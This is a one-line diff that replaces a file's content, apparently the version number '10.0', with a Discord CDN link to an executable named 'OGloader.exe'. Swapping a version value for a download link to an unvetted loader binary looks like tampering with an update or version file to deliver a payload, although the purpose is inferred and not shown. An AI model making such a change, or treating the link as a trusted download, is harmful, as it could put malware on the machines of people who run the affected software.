@@ -1,1 +1,1 @@
-10.0
+https://cdn.discordapp.com/attachments/1515416150891298816/1562578224268189718/OGloader.exe?ex=6ada7fdf&is=6ad92e5f&hm=d57aaeeac62594f0729784dc76c111d437bf68a3dbab00bd173213d4e52bdd2d&
